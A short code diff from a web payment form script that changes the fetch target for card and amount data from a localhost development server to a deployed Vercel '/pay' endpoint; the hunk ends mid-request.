@@ -8,7 +8,7 @@ document.getElementById('payment-form').addEventListener('submit', function(even
     const cvv = document.getElementById('cvv').value;
     const amount = document.getElementById('amount').value;
 
-    fetch('http://localhost:3000/pay', {
+    fetch('https://terminal-peach-six.vercel.app/pay', {
         method: 'POST',
         headers: {
             'Content-Type': 'application/json'
